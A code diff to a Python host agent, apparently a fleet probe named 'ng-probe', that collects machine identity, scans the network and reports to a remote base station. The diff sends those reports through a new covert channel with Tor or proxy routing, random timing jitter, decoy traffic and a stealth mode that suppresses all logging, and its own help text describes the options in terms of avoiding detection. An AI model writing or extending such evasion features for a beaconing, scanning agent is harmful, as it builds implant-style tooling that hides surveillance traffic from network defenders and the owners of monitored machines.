@@ -45,6 +45,8 @@ from datetime import datetime, timezone
 from pathlib import Path
 from typing import Any
 
+from network_guardian.agent.covert_comms import CovertComms, build_comms
+
 logger = logging.getLogger("ng-probe")
 
 _AGENT_DIR = Path.home() / ".ng_agent"
@@ -673,36 +675,28 @@ def _sign_payload(payload: bytes, key: str) -> str:
     return hmac.new(key.encode(), payload, hashlib.sha256).hexdigest()
 
 
-def phone_home(base_url: str, agent_key: str, report: AgentReport) -> bool:
-    """Send report to the base station. Returns True on success."""
+def phone_home(base_url: str, agent_key: str, report: AgentReport,
+               comms: CovertComms | None = None) -> bool:
+    """Send report to the base station via covert channel. Returns True on success."""
     url = f"{base_url.rstrip('/')}/api/fleet/report"
     payload = report.to_json().encode()
     sig = _sign_payload(payload, agent_key)
 
-    req = urllib.request.Request(
-        url, data=payload, method="POST",
-        headers={
-            "Content-Type": "application/json",
-            "X-Agent-ID": report.agent_id,
-            "X-Agent-Signature": sig,
-            "X-Requested-With": "XMLHttpRequest",
-        },
-    )
-    try:
-        with urllib.request.urlopen(req, timeout=15) as resp:
-            body = json.loads(resp.read())
-            if body.get("ok"):
-                logger.info("Report accepted by base station")
-                return True
-            else:
-                logger.warning("Base station rejected report: %s", body.get("message"))
-                return False
-    except urllib.error.URLError as e:
-        logger.error("Failed to reach base station: %s", e)
+    headers = {
+        "Content-Type": "application/json",
+        "X-Agent-ID": report.agent_id,
+        "X-Agent-Signature": sig,
+        "X-Requested-With": "XMLHttpRequest",
+    }
+    c = comms or build_comms()
+    ok, body = c.post(url, headers, payload)
+    if ok:
+        if body.get("ok"):
+            logger.info("Report accepted by base station")
+            return True
+        logger.warning("Base station rejected report: %s", body.get("message"))
         return False
-    except Exception as e:
-        logger.error("Phone-home error: %s", e)
-        return False
+    return False
 
 
 def register_with_base(base_url: str, agent_key: str, identity: AgentIdentity) -> bool:
@@ -738,13 +732,16 @@ def register_with_base(base_url: str, agent_key: str, identity: AgentIdentity) -
 # ---------------------------------------------------------------------------
 
 async def agent_loop(base_url: str, agent_key: str, interval: int = 60,
-                     discovery: bool = True, port_scan: bool = False) -> None:
+                     discovery: bool = True, port_scan: bool = False,
+                     comms: CovertComms | None = None) -> None:
     """Main agent loop — collect and report on interval."""
     data_dir = Path.home() / ".ng_agent"
 
     identity = AgentIdentity.collect(data_dir)
     logger.info("Agent ID: %s | Host: %s | OS: %s",
                 identity.agent_id, identity.hostname, identity.platform_os)
+
+    c = comms or build_comms()
 
     # Register
     register_with_base(base_url, agent_key, identity)
@@ -753,7 +750,7 @@ async def agent_loop(base_url: str, agent_key: str, interval: int = 60,
         try:
             report = await build_report(identity, do_discovery=discovery,
                                         do_port_scan=port_scan)
-            phone_home(base_url, agent_key, report)
+            phone_home(base_url, agent_key, report, comms=c)
         except Exception as e:
             logger.error("Agent loop error: %s", e)
 
@@ -1011,6 +1008,22 @@ def main():
                         help="Install agent as auto-start system service")
     parser.add_argument("--uninstall", action="store_true",
                         help="Remove auto-start system service")
+    parser.add_argument(
+        "--proxy",
+        help="Proxy URL for covert routing (e.g. socks5://127.0.0.1:9050, http://proxy:8080)",
+    )
+    parser.add_argument(
+        "--tor", action="store_true",
+        help="Route via Tor (auto-detect SOCKS5 on 9050/9150)",
+    )
+    parser.add_argument(
+        "--stealth", action="store_true",
+        help="Maximum stealth: long jitter, extra decoys, total log suppression",
+    )
+    parser.add_argument(
+        "--no-jitter", action="store_true",
+        help="Disable random timing delays (faster but more detectable)",
+    )
 
     args = parser.parse_args()
     logging.basicConfig(
@@ -1037,6 +1050,17 @@ def main():
     if not args.base or not args.key:
         parser.error("--base and --key are required")
 
+    # Build covert communications channel
+    comms = build_comms(
+        proxy=args.proxy or "",
+        use_tor=args.tor,
+        jitter=not args.no_jitter,
+        stealth=args.stealth,
+    )
+    cs = comms.status()
+    logger.info("Covert channel: proxy=%s, jitter=%s, decoys=%d",
+                cs["proxy"], cs["jitter"], cs["decoys"])
+
     # Wolfpak authentication gate
     auth_info = authenticate_agent(args.base, args.key,
                                     username=args.username,
@@ -1051,7 +1075,7 @@ def main():
             report = await build_report(identity,
                                         do_discovery=not args.no_discovery,
                                         do_port_scan=args.port_scan)
-            phone_home(args.base, args.key, report)
+            phone_home(args.base, args.key, report, comms=comms)
             print(json.dumps(report.to_dict(), indent=2))
         asyncio.run(run_once())
     else:
@@ -1061,6 +1085,7 @@ def main():
             interval=args.interval,
             discovery=not args.no_discovery,
             port_scan=args.port_scan,
+            comms=comms,
         ))
 
 
